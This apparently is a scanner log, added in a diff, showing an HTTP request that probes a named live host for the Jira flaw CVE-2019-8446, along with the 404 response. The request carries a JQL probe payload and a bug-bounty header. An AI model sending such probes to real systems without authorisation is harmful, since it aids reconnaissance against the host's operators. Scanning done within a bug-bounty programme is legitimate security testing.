@@ -1,0 +1,37 @@
+[CVE-2019-8446] Dumped HTTP request for https://status.techsolutions.bitpanda.com/rest/issueNav/1/issueTable
+
+
+POST /rest/issueNav/1/issueTable HTTP/1.1
+Host: status.techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Content-Length: 70
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: Close
+X-Atlassian-Token: no-check
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+
+{'jql':'project in projectsLeadByUser("30rudZJvYvPdRpkKDdrZl1yXuJp")'}
+[CVE-2019-8446] Dumped HTTP response https://status.techsolutions.bitpanda.com/rest/issueNav/1/issueTable
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 0
+Atl-Request-Id: e050a370-15c1-4812-b7c8-fdc199d8b7fb
+Atl-Traceid: e050a37015c14812b7c8fdc199d8b7fb
+Date: Tue, 05 Aug 2025 12:53:15 GMT
+Nel: {"failure_fraction": 0.001, "include_subdomains": true, "max_age": 600, "report_to": "endpoint-1"}
+Report-To: {"endpoints": [{"url": "https://dz8aopenkvv6s.cloudfront.net"}], "group": "endpoint-1", "include_subdomains": true, "max_age": 600}
+Server: AtlassianEdge
+Server-Timing: atl-edge;dur=66,atl-edge-internal;dur=3,atl-edge-upstream;dur=64,atl-edge-pop;desc="aws-us-east-1"
+Strict-Transport-Security: max-age=63072000; preload
+Via: 1.1 6ec872fa8051a500a5a9ab5ec50a79ba.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 9U3tyrOop7uNGm1aU7cHyFFLfjB-Cf2uR9OIf_VBb1U_NWwJvfy6ew==
+X-Amz-Cf-Pop: IAD89-C2
+X-Cache: Error from cloudfront
+X-Content-Type-Options: nosniff
+X-Varnish: 152598279
+X-Xss-Protection: 1; mode=block
+
+
